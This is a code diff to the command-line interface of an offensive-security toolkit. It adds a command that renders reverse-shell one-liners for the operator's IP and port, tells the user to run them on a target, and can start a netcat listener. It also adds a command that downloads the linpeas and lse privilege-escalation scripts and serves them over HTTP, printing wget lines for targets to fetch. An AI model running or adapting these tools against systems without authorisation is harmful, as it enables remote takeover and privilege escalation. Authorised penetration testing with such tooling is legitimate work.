@@ -1,19 +1,24 @@
 import json
 import os
+import re
 import sys
+from jinja2 import Template
 
 import rich_click as click
+from rich.markdown import Markdown
+from rich.rule import Rule
+
 from dotmap import DotMap
 from fp.fp import FreeProxy
 
 from secsy.celery import *
 from secsy.config import ConfigLoader
 from secsy.decorators import OrderedGroup, register_runner
-from secsy.definitions import ASCII, TEMP_FOLDER, CVES_FOLDER, ROOT_FOLDER, DEBUG
+from secsy.definitions import ASCII, TEMP_FOLDER, CVES_FOLDER, PAYLOADS_FOLDER, REVSHELLS_FOLDER, ROOT_FOLDER, SCRIPTS_FOLDER, DEBUG
 from secsy.rich import console
 from secsy.runners import Command
 from secsy.runners._base import Runner
-from secsy.utils import discover_tasks, flatten
+from secsy.utils import discover_tasks, flatten, detect_host, find_list_item
 
 click.rich_click.USE_RICH_MARKUP = True
 
@@ -35,7 +40,7 @@ if DEBUG:
 #--------#
 
 @click.group(cls=OrderedGroup)
-@click.option('--no-banner', is_flag=True, default=False)
+@click.option('--no-banner', '-nb', is_flag=True, default=False)
 def cli(no_banner):
 	"""Secsy CLI."""
 	if not no_banner:
@@ -195,6 +200,127 @@ def generate_bash_install():
 		**DEFAULT_CMD_OPTS
 	)
 	console.print(f':file_cabinet: [bold green]Saved install script to {path}[/]')
+
+
+@utils.command()
+def generate_bash_aliases():
+	pass
+
+
+@utils.command()
+def enable_aliases():
+	pass
+
+
+@utils.command()
+def disable_aliases():
+	pass
+
+
+@utils.command()
+@click.argument('name', type=str, default=None, required=False)
+@click.option('--host', '-h', type=str, default=None, help='Specify LHOST for revshell. If unspecified, LHOST will be auto-detected.')
+@click.option('--port', '-p', type=int, default=9001, show_default=True, help='Specify PORT for revshell')
+@click.option('--interface', '-i', type=str, help='Interface to use to detect IP')
+@click.option('--listen', '-l', is_flag=True, default=False, help='Spawn netcat listener on specified port')
+def revshells(name, host, port, interface, listen):
+	"""Show reverse shell source codes and run netcat listener."""
+	if host is None: # detect host automatically
+		host = detect_host(interface)
+
+	with open(f'{SCRIPTS_FOLDER}/revshells.json') as f:
+		shells = json.loads(f.read())
+		for sh in shells:
+			sh['alias'] = '_'.join(sh['name'].lower().replace('-c', '').replace('-e', '').replace('-i', '').replace('c#', 'cs').replace('#', '').strip().split(' ')).replace('_1', '')
+			cmd = re.sub(r"\s\s+", "", sh.get('command', ''), flags=re.UNICODE)
+			cmd = cmd.replace('\n', ' ')
+			sh['cmd_short'] = (cmd[:30] + '..') if len(cmd) > 30 else cmd
+
+	shell = [
+		shell for shell in shells if shell['name'] == name or shell['alias'] == name
+	]
+	if not shell:
+		console.print('Available shells:', style='bold yellow')
+		shells_str = ['[bold magenta]{alias:<20}[/][dim white]{name:<20}[/][dim gold3]{cmd_short:<20}[/]'.format(**sh) for sh in shells]
+		console.print('\n'.join(shells_str))
+	else:
+		shell = shell[0]
+		command = shell['command']
+		alias = shell['alias']
+		name = shell['name']
+		command_str = Template(command).render(ip=host, port=port, shell='bash')
+		console.print(Rule('[bold gold3][bold red]REMOTE SHELL', style='bold red', align='left'))
+		lang = shell.get('lang') or 'sh'
+		md = Markdown(f'```{lang}\n{command_str}\n```')
+		console.print(md)
+		console.print(f'Save this script as rev.{lang} and run it on your target', style='dim italic')
+		console.print()
+		console.print(Rule(style='bold red'))
+
+	if listen:
+		console.print(f'Starting netcat listener on port {port} ...', style='bold gold3')
+		cmd = f'nc -lvnp {port}'
+		Command.run_command(
+			cmd,
+			**DEFAULT_CMD_OPTS
+		)
+
+
+@utils.command()
+@click.option('--directory', '-d', type=str, default=PAYLOADS_FOLDER, show_default=True, help='HTTP server directory')
+@click.option('--host', '-h', type=str, default=None, help='HTTP host')
+@click.option('--port', '-p', type=int, default=9001, help='HTTP server port')
+@click.option('--interface', '-i', type=str, default=None, help='Interface to use to auto-detect host IP')
+def serve(directory, host, port, interface):
+	DEFAULT_PAYLOADS = [
+		{
+			'fname': 'lse.sh',
+			'description': 'Linux Smart Enumeration',
+			'command': f'wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -O lse.sh && chmod 700 lse.sh'
+		},
+		{
+			'fname': 'linpeas.sh',
+			'description': 'Linux Privilege Escalation Awesome Script',
+			'command': 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh && chmod 700 linpeas.sh'
+		}
+	]
+	console.print('Downloading payloads ...', style='bold yellow')
+	for ix, payload in enumerate(DEFAULT_PAYLOADS):
+		descr = payload.get('description', '')
+		fname = payload['fname']
+		if not os.path.exists(f'{directory}/{fname}'):
+			with console.status(f'[bold yellow][{ix}/{len(DEFAULT_PAYLOADS)}] Downloading {fname} [dim]({descr})[/] ...[/]'):
+				cmd = payload['command']
+				console.print(f'[bold magenta]{fname} [dim]({descr})[/] ...[/]', )
+				opts = DEFAULT_CMD_OPTS.copy()
+				opts['no_capture'] = False
+				Command.run_command(
+					cmd,
+					cls_attributes={'shell': True},
+					cwd=directory,
+					**opts
+				)
+		console.print()
+
+	console.print(Rule())
+	console.print('Available payloads: ', style='bold yellow')
+	opts = DEFAULT_CMD_OPTS.copy()
+	opts['print_cmd'] = False
+	for fname in os.listdir(directory):
+		if not host:
+			host = detect_host(interface)
+		payload = find_list_item(DEFAULT_PAYLOADS, fname, key='fname', default={})
+		fdescr = payload.get('description', 'No description')
+		console.print(f'{fname} [dim]({fdescr})[/]', style='bold magenta')
+		console.print(f'wget http://{host}:{port}/{fname}', style='dim italic')
+		console.print('')
+	console.print(Rule())
+	console.print('Starting HTTP server ...', style='bold yellow')
+	Command.run_command(
+		f'python -m http.server {port}',
+		cwd=directory,
+		**DEFAULT_CMD_OPTS
+	)
 
 
 #------#
